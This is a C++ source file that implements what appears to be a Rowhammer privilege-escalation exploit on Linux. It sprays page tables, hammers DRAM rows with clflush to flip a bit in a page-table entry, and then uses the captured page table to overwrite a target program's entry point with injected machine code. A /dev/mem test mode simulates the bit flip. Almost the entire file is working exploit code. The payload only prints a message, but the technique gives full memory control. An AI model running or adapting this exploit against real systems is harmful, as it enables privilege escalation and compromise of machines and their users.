
#include <assert.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <unistd.h>

#include <algorithm>
#include <vector>

#include "libswapcpu.h"

const size_t memory_size = ((size_t) 90) << 20;

const size_t large_page = 2 << 20;
const size_t page_size = 0x1000;

const size_t file_size = large_page * 2;

const size_t data_page_marker = 0x43215678;

const char target_prog_path[] = "/mnt/target_prog";

// Which bit in the 64-bit PTE to flip.
const int test_bit_to_flip = 8 + 12; // Bit 8 in the physical page number.

int g_mem_fd;
uintptr_t g_victim_phys_addr;

struct HammerAddrs {
  uint64_t agg1;
  uint64_t agg2;
  uint64_t victim;
};

void mount_proc() {
  int rc = mkdir("/proc", 0777);
  assert(rc == 0);
  rc = mount("", "/proc", "proc", 0, NULL);
  assert(rc == 0);
}

// Extract the physical page number from a Linux /proc/PID/pagemap entry.
uint64_t frame_number_from_pagemap(uint64_t value) {
  return value & ((1ULL << 54) - 1);
}

uint64_t get_physical_addr(uintptr_t virtual_addr) {
  int fd = open("/proc/self/pagemap", O_RDONLY);
  assert(fd >= 0);

  off_t pos = lseek(fd, (virtual_addr / page_size) * 8, SEEK_SET);
  assert(pos >= 0);
  uint64_t value;
  int got = read(fd, &value, 8);
  assert(got == 8);
  int rc = close(fd);
  assert(rc == 0);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));

  uint64_t frame_num = frame_number_from_pagemap(value);
  return (frame_num * page_size) | (virtual_addr & (page_size - 1));
}

class PhysPageFinder {
  static const size_t num_pages = memory_size / page_size;

  uint64_t *phys_addrs; // Array
  uintptr_t mem;

  void unmap_range(uintptr_t start, uintptr_t end) {
    assert(start <= end);
    if (start < end) {
      int rc = munmap((void *) start, end - start);
      assert(rc == 0);
    }
  }

public:
  PhysPageFinder() {
    printf("PhysPageFinder: Allocate...\n");
    mem = (uintptr_t) mmap(NULL, memory_size, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
    assert(mem != (uintptr_t) MAP_FAILED);

    phys_addrs = new uint64_t[num_pages];
    assert(phys_addrs);

    printf("PhysPageFinder: Build page map...\n");
    int fd = open("/proc/self/pagemap", O_RDONLY);
    assert(fd >= 0);
    ssize_t read_size = sizeof(phys_addrs[0]) * num_pages;
    ssize_t got = pread(fd, phys_addrs, read_size, (mem / page_size) * 8);
    assert(got == read_size);
    int rc = close(fd);
    assert(rc == 0);
    for (size_t i = 0; i < num_pages; i++) {
      // We're not checking the "page present" field here because it's
      // not always set.  We are probably allocating more than the
      // kernel really wants to give us.
      phys_addrs[i] = frame_number_from_pagemap(phys_addrs[i]);
    }
  }

  bool find_page(uint64_t phys_addr, uintptr_t *virt_addr) {
    for (size_t i = 0; i < num_pages; i++) {
      if (phys_addrs[i] == phys_addr / page_size) {
        *virt_addr = mem + i * page_size;
        return true;
      }
    }
    return false;
  }

  void dump_vulnerable_pairs() {
    int i=0;
    printf("beginning dump\n");

    const int dist = 1<<(6+7+2);
    const int rows = 50;

    while (i<rows-3) {
      uint64_t lower = get_physical_addr(mem+(0+i)*dist);
      uint64_t middle = get_physical_addr(mem+(1+i)*dist);
      uint64_t upper = get_physical_addr(mem+(2+i)*dist);
      if (lower+dist == middle && middle+dist == upper) {
        printf("RESULT PAIR,0x%016lx,0x%016lx,0x%016lx\n", lower, upper, middle);
      }
      i++;
    }
    exit(0);
  }

  void unmap_other_pages(uintptr_t *keep_addrs, uintptr_t *keep_addrs_end) {
    printf("PhysPageFinder: Unmapping...\n");
    // Coalesce munmap() calls for speed.
    std::sort(keep_addrs, keep_addrs_end);
    uintptr_t addr_to_free = mem;
    uintptr_t end_addr = mem + memory_size;
    while (keep_addrs < keep_addrs_end) {
      unmap_range(addr_to_free, *keep_addrs);
      addr_to_free = *keep_addrs + page_size;
      keep_addrs++;
    }
    unmap_range(addr_to_free, end_addr);
  }
};

void clflush(uintptr_t addr) {
  asm volatile("clflush (%0)" : : "r" (addr) : "memory");
}

class BitFlipper {
  // TODO: argue why this number, problem is we need a small amount of bits, a lot of bits break
  static const int hammer_count = 5500;

  const struct HammerAddrs *phys;
  uintptr_t agg1;
  uintptr_t agg2;
  uintptr_t victim;

  // Offset, in bytes, of 64-bit victim location from start of page.
  int flip_offset_bytes;
  // The bit number that changes.
  int bit_number;
  // 1 if this is a 0 -> 1 bit flip, 0 otherwise.
  uint8_t flips_to;

  bool hammer_and_check(uint64_t init_val) {
    uint64_t *victim_end = (uint64_t *) (victim + page_size);

    // Initialize victim page.
    for (uint64_t *addr = (uint64_t *) victim; addr < victim_end; addr++) {
      *addr = init_val;
      // Flush so that the later check does not just return cached data.
      clflush((uintptr_t) addr);
    }

    libswapcpu_swapcpu();
    hammer_pair();
    libswapcpu_swapcpu();

    // Check for bit flips.
    bool seen_flip = false;
    for (uint64_t *addr = (uint64_t *) victim; addr < victim_end; addr++) {
      uint64_t val = *addr;
      if (val != init_val) {
        seen_flip = true;
        flip_offset_bytes = (uintptr_t) addr - victim;
        printf("  Flip at offset 0x%x: 0x%llx\n",
               flip_offset_bytes, (long long) val);
        for (int bit = 0; bit < 64; bit++) {
          if (((init_val >> bit) & 1) != ((val >> bit) & 1)) {
            flips_to = (val >> bit) & 1;
            bit_number = bit;
            printf("    Changed bit %i to %i\n", bit, flips_to);
          }
        }
      }
    }
    return seen_flip;
  }

public:
  BitFlipper(const struct HammerAddrs *phys): phys(phys), flips_to(0) {}

  void hammer_pair() {
    for (int i = 0; i < hammer_count; i++) {
      *(volatile int *) agg1;
      *(volatile int *) agg2;
      clflush(agg1);
      clflush(agg2);
    }
  }

  bool find_pages(PhysPageFinder *finder) {
    return (finder->find_page(phys->agg1, &agg1) &&
            finder->find_page(phys->agg2, &agg2) &&
            finder->find_page(phys->victim, &victim));
  }

  bool initial_hammer() {
    // Test both 0->1 and 1->0 bit flips.
    bool seen_flip = false;
    seen_flip |= hammer_and_check(0);
    seen_flip |= hammer_and_check(~(uint64_t) 0);
    return seen_flip;
  }

  int get_flip_offset_bytes() { return flip_offset_bytes; }
  int get_bit_number() { return bit_number; }
  uint8_t get_flips_to() { return flips_to; }

  void retry_to_check() {
    printf("Retry...\n");
    int retries = 1;
    int hits = 0;
    uint64_t init_val = flips_to ? 0 : ~(uint64_t) 0;
    for (int i = 0; i < retries; i++) {
      // To save time, only try one initial value now.
      if (hammer_and_check(init_val)) {
        hits++;
      }
    }
    printf("Got %i hits out of %i\n", hits, retries);
    assert(hits > 0);
  }

  void unmap_other_pages(PhysPageFinder *finder) {
    uintptr_t pages[] = { agg1, agg2, victim };
    finder->unmap_other_pages(pages, pages + 3);
  }

  void release_victim_page() {
    int rc = munmap((void *) victim, page_size);
    assert(rc == 0);
  }
};

BitFlipper *find_bit_flipper(const char *addrs_file) {
  std::vector<HammerAddrs> flip_addrs;
  FILE *fp = fopen(addrs_file, "r");
  if (!fp) {
    printf("Can't open '%s': %s\n", addrs_file, strerror(errno));
    exit(1);
  }
  while (!feof(fp)) {
    HammerAddrs addrs;
    int got = fscanf(fp, "RESULT PAIR,"
                     "0x%" PRIx64 ","
                     "0x%" PRIx64 ","
                     "0x%" PRIx64,
                     &addrs.agg1, &addrs.agg2, &addrs.victim);
    if (got == 3) {
      flip_addrs.push_back(addrs);
    }
    // Skip the rest of the line.
    for (;;) {
      int ch = fgetc(fp);
      if (ch == '\n' || ch == EOF)
        break;
    }
  }
  fclose(fp);

  PhysPageFinder finder;
  // finder.dump_vulnerable_pairs();

  for (size_t i = 0; i < flip_addrs.size(); i++) {
    const struct HammerAddrs *addrs = &flip_addrs[i];
    BitFlipper *flipper = new BitFlipper(addrs);
    bool found = flipper->find_pages(&finder);
    printf("Entry %zi: 0x%09llx, 0x%09llx, 0x%09llx - %s\n", i,
           (long long) addrs->agg1,
           (long long) addrs->agg2,
           (long long) addrs->victim,
           found ? "found" : "missing");
    if (found) {
      if (flipper->initial_hammer()) {
        int bit = flipper->get_bit_number();
        // Is this bit flip useful for changing the physical page
        // number in a PTE?  Assume 4GB of physical pages.
        if (bit >= 12 && bit < 27) {
          printf("Useful bit flip -- continuing...\n");
          flipper->unmap_other_pages(&finder);
          flipper->retry_to_check();
          return flipper;
        } else {
          printf("  We don't know how to exploit a flip in bit %i\n", bit);
        }
      }
    }
    delete flipper;
  }
  printf("No usable bit flips found\n");
  exit(1);
}

void flip_bit() {
  printf("Test mode: Flipping bit at address %llx...\n",
         (long long) g_victim_phys_addr);
  uint64_t val;
  int got = pread(g_mem_fd, &val, sizeof(val), g_victim_phys_addr);
  assert(got == sizeof(val));
  printf("  before:  val=0x%llx\n", (long long) val);
  if (val == data_page_marker) {
    printf("This value indicates this is a data page\n");
    abort();
  }
  val ^= 1 << test_bit_to_flip;
  printf("  after:   val=0x%llx\n", (long long) val);
  printf("  Changed bit %i to %i\n",
         test_bit_to_flip, (int) ((val >> test_bit_to_flip) & 1));
  int written = pwrite(g_mem_fd, &val, sizeof(val), g_victim_phys_addr);
  assert(written == sizeof(val));
}

class Fragmenter {
  static const size_t reserve_size = memory_size;
  static const size_t num_pages = reserve_size / page_size;
  uintptr_t mem;
  uint32_t *pages;
  size_t current_page;

  uintptr_t get_page_addr(size_t idx) {
    assert(idx < num_pages);
    return mem + pages[idx] * page_size;
  }

public:
  Fragmenter() {
    mem = (uintptr_t) mmap(NULL, reserve_size, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
    assert(mem != (uintptr_t) MAP_FAILED);

    assert(num_pages == (uint32_t) num_pages);
    pages = new uint32_t[num_pages];
    assert(pages);
    for (size_t i = 0; i < num_pages; ++i)
      pages[i] = i;
    std::random_shuffle(pages, &pages[num_pages]);
    current_page = 0;

    for (size_t i = 0; i < num_pages; i++) {
      // Mark the page for debugging purposes.
      *(int *) get_page_addr(i) = 0x9999;
    }
  }

  uintptr_t next_page_addr() {
    return get_page_addr(current_page);
  }

  void release_page() {
    if (current_page < num_pages) {
      int *addr = (int *) get_page_addr(current_page);
      // Mark the page for debugging purposes.
      *addr = 0x8888;

      // We don't use munmap() here because that is likely to split
      // the VMA in two, which may exceed Linux's limit on the number
      // of VMAs per process.
      int rc = madvise(addr, page_size, MADV_DONTNEED);
      assert(rc == 0);
      current_page++;
    }
  }

  void release_bytes(size_t bytes) {
    for (size_t i = 0; i < bytes / page_size; i++) {
      release_page();
    }
  }
};

void init_dev_mem() {
  int rc = mknod("/dev/mem", 0777 | S_IFCHR, 0x101);
  assert(rc == 0);
  g_mem_fd = open("/dev/mem", O_RDWR);
  assert(g_mem_fd >= 0);

  // Check that /dev/mem works.
  int *mem = (int *) mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
  assert(mem != (int *) MAP_FAILED);
  for (int i = 0; i < 10; i++) {
    *mem = i;
    int val = 0;
    int got = pread(g_mem_fd, &val, sizeof(val),
                    get_physical_addr((uintptr_t) mem));
    assert(got == sizeof(val));
    assert(val == i);
  }
  rc = munmap(mem, page_size);
  assert(rc == 0);
}

int run_target_prog() {
  printf("Running target executable...\n");
  int pid = fork();
  assert(pid >= 0);
  if (pid == 0) {
    execl(target_prog_path, target_prog_path, NULL);
    perror("exec");
    abort();
  }
  int status;
  int pid2 = waitpid(pid, &status, 0);
  assert(pid2 == pid);
  return status;
}

// We don't want to call fork() in the main process after we have
// created a large number of VMAs, because the kernel would have to
// copy all of those VMAs, which consumes memory.  Instead, we create
// a subprocess which will fork() on our behalf in response to IPCs.
class ProcessLauncher {
  int parent_socket;

  void in_subprocess(int child_socket) {
    int rc = close(parent_socket);
    assert(rc == 0);
    for (;;) {
      char buf;
      int got = read(child_socket, &buf, sizeof(buf));
      assert(got >= 0);
      if (got == 0)
        break;
      assert(buf == 'L');
      int status = run_target_prog();
      int written = write(child_socket, &status, sizeof(status));
      assert(written == sizeof(status));
    }
  }

public:
  ProcessLauncher() {
    int sockets[2];
    int rc = socketpair(AF_UNIX, SOCK_STREAM, 0, sockets);
    assert(rc == 0);
    parent_socket = sockets[0];

    int pid = fork();
    assert(pid >= 0);
    if (pid == 0) {
      in_subprocess(sockets[1]);
      _exit(1);
    }
    rc = close(sockets[1]);
    assert(rc == 0);
  }

  int launch_target_prog() {
    int written = write(parent_socket, "L", 1);
    assert(written == 1);
    int status;
    int got = read(parent_socket, &status, sizeof(status));
    assert(got >= 0);
    assert(got == sizeof(status));
    return status;
  }
};

extern char template_start[];
extern char template_end[];
asm(".pushsection .text, \"ax\", @progbits\n"
    ".global template_start\n"
    ".global template_end\n"
    "template_start:\n"
    // Call write()
    "movl $1, %eax\n"  // __NR_write
    "movl $1, %edi\n"  // arg 1: stdout
    "leaq string(%rip), %rsi\n"  // arg 2: string
    "movl $string_end - string, %edx\n"  // arg 3: length of string
    "syscall\n"
    "loop:\n"
    // Call exit()
    "movl $231, %eax\n"  // __NR_exit_group
    "movl $99, %edi\n"  // arg 1: exit value
    "syscall\n"
    "jmp loop\n"

    "string: .string \"Escape!\\n\"\n"
    "string_end:\n"
    "template_end:\n"
    ".popsection\n");

class ProgPatcher {
  uintptr_t virt_addr;
  uint64_t phys_addr;

  size_t template_size() { return template_end - template_start; }

public:
  ProgPatcher() {
    int prog_fd = open(target_prog_path, O_RDONLY);
    assert(prog_fd >= 0);
    struct stat st;
    int rc = fstat(prog_fd, &st);
    assert(rc == 0);
    uintptr_t prog_data =
      (uintptr_t) mmap(NULL, st.st_size, PROT_READ,
                       MAP_SHARED | MAP_POPULATE, prog_fd, 0);
    assert(prog_data != (uintptr_t) MAP_FAILED);
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *) prog_data;
    uintptr_t load_start = 0x400000; // TODO: Don't assume this.
    virt_addr = prog_data + ehdr->e_entry - load_start;
    phys_addr = get_physical_addr(virt_addr);
    // Check that we only need to modify one page.
    assert(phys_addr / page_size == (phys_addr + template_size()) / page_size);
  }

  void patch(uint64_t *pte, char *page) {
    uint64_t page_number = phys_addr / page_size;
    uint32_t offset_in_page = phys_addr % page_size;
    *pte = (page_number << 12) | 0x27;
    assert(memcmp((void *) virt_addr, page + offset_in_page,
                  template_size()) == 0);
    memcpy(page + offset_in_page, template_start, template_size());
  }
};

void main_prog(int test_mode, const char *addrs_file) {
  if (test_mode)
    mount_proc();
  ProcessLauncher launcher;
  BitFlipper *flipper = NULL;
  if (!test_mode)
    flipper = find_bit_flipper(addrs_file);
  Fragmenter fragmenter;
  if (test_mode)
    init_dev_mem();

  // Max number of VMAs that we can create: Linux's default limit,
  // minus margin for VMAs already created.
  const size_t max_vmas = (1 << 16) - 20;

  // Offset, in bytes, into page where we generate a bit flip.
  int flip_offset_bytes = test_mode ? 0x100 : flipper->get_flip_offset_bytes();
  int flip_offset_page = flip_offset_bytes / 8;
  printf("flip_offset_page=%i\n", flip_offset_page);

  // The number of the bit in the PTE that flips.
  int flip_bit_number =
    test_mode ? test_bit_to_flip : flipper->get_bit_number();

  size_t target_pt_size;
  size_t target_mapping_size;
  size_t iterations;

  // Choose a file size.  We want to pick a small value so as not to
  // waste memory on data pages that could be used for page tables
  // instead.  However, if we make the size too small, we'd have to
  // create too many VMAs to generate our target quantity of page
  // tables.
  size_t file_size = large_page;
  for (;;) {
    // Size in bytes of page tables we're aiming to create.
    target_pt_size = memory_size - file_size;
    // Number of 4k page table pages we're aiming to create.
    target_mapping_size = target_pt_size * (large_page / page_size);
    // Number of VMAs we will create.
    iterations = target_mapping_size / file_size;
    if (iterations < max_vmas)
      break;
    file_size *= 2;
  }
  printf("file_size=%zi MB\n", file_size >> 20);
  printf("iterations=%zi\n", iterations);

  // Reserve address space so that the real mappings we create will be
  // 2MB-aligned.
  size_t reserve_size = target_mapping_size + large_page;
  uintptr_t mem_base =
    (uintptr_t) mmap(NULL, reserve_size, PROT_NONE,
                     MAP_PRIVATE | MAP_ANON | MAP_NORESERVE, -1, 0);
  assert(mem_base != (uintptr_t) MAP_FAILED);
  uintptr_t top_alloc = mem_base + reserve_size;
  mem_base = (mem_base + large_page - 1) & ~(large_page - 1);
  uintptr_t next_alloc = mem_base;

  // If the temp file lives on a disc-backed filesystem, we are liable
  // to get its pages mapped via read-only PTEs.  Using tmpfs, which
  // is in-memory-only, avoids that problem.
  const char *temp_file = "/dev/shm/temp_file_for_rowhammer_privesc";
  if (test_mode)
    temp_file = "temp_file";
  int fd = open(temp_file, O_CREAT | O_RDWR, 0666);
  assert(fd >= 0);
  int rc = ftruncate(fd, file_size);
  assert(rc == 0);

  // Release enough pages so that we can allocate the file.
  fragmenter.release_bytes(file_size);

  struct timeval t0;
  rc = gettimeofday(&t0, NULL);
  assert(rc == 0);

  size_t pte_size_per_iteration = file_size / (page_size / 8);
  size_t pte_size = 0;
  for (size_t i = 0; i < iterations; i++) {
    if (i == iterations / 2) {
      if (test_mode) {
        g_victim_phys_addr =
          get_physical_addr(fragmenter.next_page_addr()) + flip_offset_bytes;
      } else {
        flipper->retry_to_check();
        flipper->release_victim_page();
      }
    }
    fragmenter.release_bytes(pte_size_per_iteration);

    assert(next_alloc + file_size <= top_alloc);
    void *mapped = mmap((void *) next_alloc, file_size, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_FIXED, fd, 0);
    assert(mapped == (void *) next_alloc);
    next_alloc += file_size;

    // Fault in one entry of each page table: Pick the entry where we
    // expect to get the bit flip.
    for (size_t offset = 0; offset < file_size; offset += large_page) {
      *((volatile char *) mapped + offset + flip_offset_page * page_size);
    }

    pte_size += pte_size_per_iteration;
    if ((i + 1) % 1000 == 0 || i == iterations - 1) {
      struct timeval now;
      rc = gettimeofday(&now, NULL);
      assert(rc == 0);
      double taken =
        (now.tv_sec - t0.tv_sec) + (now.tv_usec - t0.tv_usec) * 1e-6;

      printf("pte_pages=%zi, pte_size=%zd MB, rate=%.1f MB/sec\n",
             pte_size / 0x1000, pte_size >> 20,
             pte_size / taken / (1 << 20));
    }

    if (i == 0) {
      for (size_t offset = 0; offset < file_size; offset += 0x1000) {
        // Add marker so that we can identify the physical pages in the
        // memory dump.
        char *ptr = (char *) mapped + offset;
        ((uint64_t *) ptr)[0] = data_page_marker;
        ((uint64_t *) ptr)[1] = offset / 0x1000;
      }
      // Analyse which direction of bit flip (1->0 or 0->1) would be
      // exploitable given the page frame numbers of the data pages
      // that the kernel allocated for us.
      printf("Out of %i page tables per mmap():\n",
             (int) (file_size / large_page));
      for (size_t offset = 0; offset < file_size; offset += large_page) {
        uintptr_t virt_addr = ((uintptr_t) mapped + offset +
                               flip_offset_page * page_size);
        uint64_t phys_addr = get_physical_addr(virt_addr);
        int required_bit_val = ((phys_addr >> flip_bit_number) & 1) ^ 1;
        printf("  Page table %zi requires flip to %i: address is 0x%llx\n",
               offset / large_page, required_bit_val, (long long) phys_addr);
      }
    }
  }

  int status = launcher.launch_target_prog();
  assert(status == 44 << 8);
  ProgPatcher patcher;

  if (test_mode) {
    flip_bit();
  } else {
    libswapcpu_swapcpu();
    printf("Trying to cause bit flip...\n");
    for (int i = 0; i < 1; i++)
      flipper->hammer_pair();
    libswapcpu_swapcpu();
  }

  printf("Searching for modified PTE...\n");
  // We don't need to search every page, because we know which entry
  // in the page table we modified.
  for (size_t idx = flip_offset_page; idx < target_mapping_size / page_size;
       idx += 512) {
    uint64_t *addr = (uint64_t *) (mem_base + idx * page_size);
    uint64_t val = *addr;
    if (val != data_page_marker) {
      printf("  Found at index 0x%zx\n", idx);
      int pt_index = (idx / 512) % (file_size / large_page);
      printf("  In page table %i (out of %i per mmap())\n",
             pt_index, (int) (file_size / large_page));
      // If we're successful (if addr points to one of our page
      // tables), we expect entry 0 to be 0 (unless flip_offset_page
      // == 0).
      printf("  Entry 0 contains 0x%llx\n", (long long) val);
      // If we're successful, we expect this value to be a non-zero PTE.
      printf("  Entry %i contains 0x%llx\n",
             flip_offset_page, (long long) addr[flip_offset_page]);

      printf("Modifying PTE...\n");
      uint64_t old_pte = addr[1];
      uint64_t new_pte = 0x27;
      addr[1] = new_pte;
      printf("Searching for page that uses this PTE...\n");
      for (size_t idx2 = 1; idx2 < target_mapping_size / page_size;
           idx2 += 512) {
        uint64_t *addr2 = (uint64_t *) (mem_base + idx2 * page_size);
        uint64_t val = *addr2;
        if (val != data_page_marker && idx2 != idx) {
          printf("  Found at index 0x%zx\n", idx2);
          printf("  Points to 0x%llx\n", (long long) val);

          uint64_t old_pte = addr[2];
          patcher.patch(&addr[2], (char *) addr2 + page_size);
          addr[2] = old_pte; // Restore old PTE.
          int status = launcher.launch_target_prog();
          assert(status == 99 << 8);
          goto found2;
        }
      }
      printf("Failed: The page we got access to was not one of our "
             "page tables\n");
    found2:
      addr[1] = old_pte; // Restore old PTE.
      goto found1;
    }
  }
  printf("Failed: No modified page found; no bit flip changed our PTE\n");
 found1:
  if (test_mode) {
    // Restore: Flip the bit back again to stop Linux warning on process exit.
    printf("\nTest mode: Cleaning up: Undoing bit flip\n");
    flip_bit();
  }
  exit(0);

  printf("SPRAY_END\n");
  for (;;) {
    sleep(999);
  }
}

int main(int argc, char **argv) {
  libswapcpu_init();

  setvbuf(stdout, NULL, _IONBF, 0);

  bool test_mode = (getpid() == 1);

  const char *addrs_file = NULL;
  if (!test_mode) {
    if (argc != 2) {
      printf("Usage: %s <bit-flip-addrs-file>\n", argv[0]);
      return 1;
    }
    addrs_file = argv[1];
  }

  // Fork a subprocess so that we can print the test process's exit
  // status, and to prevent reboots or kernel panics if we are running
  // as PID 1.
  int pid = fork();
  if (pid == 0) {
    main_prog(test_mode, addrs_file);
    _exit(1);
  }

  int status;
  if (waitpid(pid, &status, 0) == pid) {
    printf("** exited with status %i (0x%x)\n", status, status);
  }

  if (getpid() == 1) {
    // We're the "init" process.  Avoid exiting because that would
    // cause a kernel panic, which can cause a reboot or just obscure
    // log output and prevent console scrollback from working.
    for (;;) {
      sleep(999);
    }
  }
  return 0;
}
